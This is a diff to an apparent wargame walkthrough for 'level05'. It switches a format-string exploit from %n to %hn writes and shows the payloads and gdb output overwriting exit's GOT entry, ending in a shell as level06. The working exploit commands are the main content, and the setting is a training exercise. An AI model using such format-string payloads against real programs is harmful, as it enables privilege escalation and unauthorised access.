@@ -88,18 +88,18 @@ First we need to write two addresses, the address of `exit` and the address of `
 To change word by word.
 
 ```shell
-python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%10d%10$n" + "%20d%11$n"'
+python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%10d%10$hn" + "%20d%11$hn"'
 -- ADDRESS OF ONE --- ADDRESS OF TWO --- %{value to write}%{argument number where I change the value} --- %{value to write}%{argument number where I change the value}
 ```
 
 Let's try it.
 
 ```shell
-(gdb) r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%10d%10$n" + "%20d%11$n"')
+(gdb) r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%10d%10$hn" + "%20d%11$hn"')
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
 
-Starting program: /home/users/level05/level05 < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%10d%10$n" + "%20d%11$n"')
+Starting program: /home/users/level05/level05 < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%10d%10$hn" + "%20d%11$hn"')
        100          -134415680
 
 Breakpoint 1, 0x0804850c in main ()
@@ -125,12 +125,12 @@ Second WORD : ffff
 Perfect now I just have to put it in my payload.
 
 ```shell
-(gdb) r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55457d%10$n" + "%10070d%11$n"')
+(gdb) r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55457d%10$hn" + "%10070d%11$hn"')
 [...]
 (gdb) x/x 0x080497e0
 0x80497e0 <exit@got.plt>:	0xffffd8a9
 (gdb) q
-$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55457d%10$n" + "%10070d%11$n"'; cat -) | ./level05
+$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55457d%10$hn" + "%10070d%11$hn"'; cat -) | ./level05
 [...]
 whoami
 level06
